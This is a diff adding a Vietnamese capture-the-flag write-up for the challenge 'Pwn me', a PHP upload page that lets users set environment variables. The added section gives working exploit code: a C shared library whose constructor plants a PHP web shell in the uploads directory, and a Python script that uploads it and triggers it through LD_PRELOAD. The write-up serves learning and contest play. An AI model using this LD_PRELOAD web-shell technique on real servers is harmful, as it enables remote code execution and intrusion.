@@ -103,4 +103,138 @@ echo 4B4D414354467B4A7573742073696D706C652073716C20696E6A656374696F6E20776974682
 
 **flag**: `KMACTF{Just simple sql injection with some tricks}`
 
-## pass
+## Pwn me
+
+Challenge cho source code:
+
+```php
+<?php
+
+if ( isset($_GET["source"]) ) {
+    highlight_file(__FILE__);
+    die();
+}
+
+// Process file upload
+if (isset($_FILES["file"])) {    
+    // Clean storage
+    $files = count(glob( "uploads/*"));
+    if ($files > 100) {
+        system("rm uploads/*");
+    }
+
+    $fileExt = strtolower(pathinfo($_FILES["file"]["name"],PATHINFO_EXTENSION));
+    
+    if ( preg_match("/ph/i", $fileExt) )
+        die("Don't cheat my fen");
+
+    $fileName = md5(rand(1, 1000000000)).".".$fileExt;
+    $target_file = "uploads/" . $fileName;
+    
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        die("Your file: ".getcwd()."/".$target_file);
+    } else {
+        die("Something went wrong\n");
+    }
+
+}
+// Add enviroment variable
+if (isset($_GET["env"])) {
+    foreach ($_GET["env"] as $key => $value) {
+        if ( preg_match("/[A-Za-z_]/i", $key) && !preg_match("/bash/i", $key) )
+            putenv($key."=".$value);
+    }
+}
+
+system("echo pwnme!!");
+
+?>
+
+<form action="/" method="post" enctype="multipart/form-data">
+  Select evil file to upload:
+  <input type="file" name="file"> <br />
+  <input type="submit" value="Upload" name="submit">
+</form>
+
+<!-- ?source=1 -->
+```
+
+Thật dễ hiểu khi đọc write up với các step tưởng như logic dễ dàng suy luận ra trong khi thực tế đó còn là nỗi sợ đi sai hướng hay bị đánh lừa đối với người thiếu kinh nghiệm như mình. Nhưng dù sao mỗi thất bại là 1 bài học.
+
+Sau khi review source code, mình come up với keyword để google: `php file upload rce enviroment variable`
+
+Ở đây mình có tìm được 1 bài RCE với env và file upload nhưng cần hàm `mail()` được gọi. Mình cũng biết cần set biến `LD_PRELOAD`
+
+Google tiếp: `php file upload rce enviroment variable LD_PRELOAD`
+
+https://www.anquanke.com/post/id/175403
+
+**Chú thích**:
+
+`LD_PRELOAD`: is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so). This is called preloading a library.
+
+`putenv ( string $setting ) : bool`
+
+Khi 1 file thực thi thực hiện 1 thao tác/hàm nào đó nó sẽ reference đến thư viện cần được sử dụng, ở đây optional env `LD_PRELOAD` chứa path đến thư viện cần reference sẽ được lựa chọn khi được set.
+
+Với việc kiểm soát được hàm set biến môi trường `putenv()` ta có thể set biến này.
+
+Để tấn công, có 2 cách:
+
+1. Cách thứ nhất `hijacking function`:
+```c
+int geteuid() 
+{
+    if (getenv("LD_PRELOAD") == NULL) { return 0; }
+    unsetenv("LD_PRELOAD");
+    system("ls");
+}
+```
+Ta có thể upload 1 file thực thi(C) chứa chứa hàm bị hijack mà sẽ được gọi khi 1 hàm nào đó như `mail()` sẽ gọi đến `geteuid()`. Và vì thế, chỉ có thể exploit khi mà `mail()` được gọi.
+
+2. Cách hai `hijack shared library`:
+```c
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv("LD_PRELOAD");
+    system("ls");
+}
+```
+Tương tự như trên, nhưng ở đây với `__attribute__ ((__constructor__))` bất cứ hàm nào load library thì hàm trên sẽ được tự động gọi.
+
+**Exploit**:
+
+`evil.c`:
+```c
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv("LD_PRELOAD");
+    system("echo \"<?php system('cat /flag.txt'); ?>\" > /var/www/html/uploads/devme.php");
+}
+```
+
+`exploit.py`:
+```python
+import requests
+import os
+
+os.system("gcc -Wall -fPIC -shared -o evil.so evil.c -ldl")
+
+url = 'http://45.32.110.58:20102/'
+ 
+files = {'file': open('evil.so','rb')}
+r = requests.post(url, files=files)
+
+file_uploaded = r.text[r.text.index(': ')+2:]
+
+print(file_uploaded)
+print(requests.get(url, params={'env[LD_PRELOAD]':file_uploaded}).status_code)
+
+results = requests.get(url+'uploads/devme.php?command=ls')
+print(results.text)
+```
+
+**flag**: `KMACTF{LD_Preload is also a way to RCE}`
